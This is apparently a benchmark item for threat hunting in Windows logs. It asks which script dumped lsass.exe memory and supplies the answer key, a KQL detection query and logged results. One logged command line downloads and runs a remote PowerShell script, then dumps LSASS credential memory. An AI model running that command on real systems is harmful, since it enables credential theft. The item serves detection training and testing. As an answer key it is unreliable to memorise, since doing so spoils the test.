@@ -1,0 +1,34 @@
+{
+    "technique_id": "T1003.001",
+    "question_id": "6502c8f0-b775-4dbd-9193-1298f56b6781",
+    "context": "On a Windows host, attackers often dump the lsass.exe process memory for offline credential theft by invoking external PowerShell scripts.",
+    "objective": "Find instances where lsass.exe memory was dumped via a downloaded PowerShell script.",
+    "technical_details": {
+        "command_analysis": "Look for PowerShell process events where the command line references a memory-dumping script targeting lsass.exe.",
+        "detection_approach": "Search DeviceProcessEvents for PowerShell executions that include a .ps1 file name used to dump LSASS memory."
+    },
+    "thinking_how_to_phrase_question_and_answer": "Frame the question to require the analyst to hunt through process command lines and extract the exact script name.",
+    "prompt": "Using Windows process event logs, investigate PowerShell activity around lsass.exe memory capture. What was the name of the script file invoked to perform the dump?",
+    "answer": [
+        "Out-Minidump.ps1"
+    ],
+    "difficulty": "medium",
+    "KQL_query": "DeviceProcessEvents\n| where FileName in (\"powershell.exe\",\"pwsh.exe\")\n| where ProcessCommandLine has \"Out-Minidump.ps1\" and ProcessCommandLine has \"lsass\"\n| project TimeGenerated, DeviceName, InitiatingProcessAccountName, ProcessId, ProcessCommandLine",
+    "KQL_validation_message": "KQL query validation successful: The ProcessCommandLine field contains a command that downloads and invokes Out-Minidump.ps1 from the Atomic Red Team repository. This matches the expected answer of 'Out-Minidump.ps1' being involved in the activity. The evidence is present in the command line, so the query results provide the information needed for this detection.",
+    "KQL_query_results": [
+        [
+            "TimeGenerated",
+            "DeviceName",
+            "InitiatingProcessAccountName",
+            "ProcessId",
+            "ProcessCommandLine"
+        ],
+        [
+            "2025-05-07 16:18:51.677743+00:00",
+            "windows-vm",
+            "wipro",
+            8504,
+            "\"powershell.exe\" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \\\"\"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\\\\"\" -ErrorAction Ignore -Force | Out-Null\ntry{ IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop}\ncatch{ $_; exit $_.Exception.Response.StatusCode.Value__}\nget-process lsass | Out-Minidump}"
+        ]
+    ]
+}
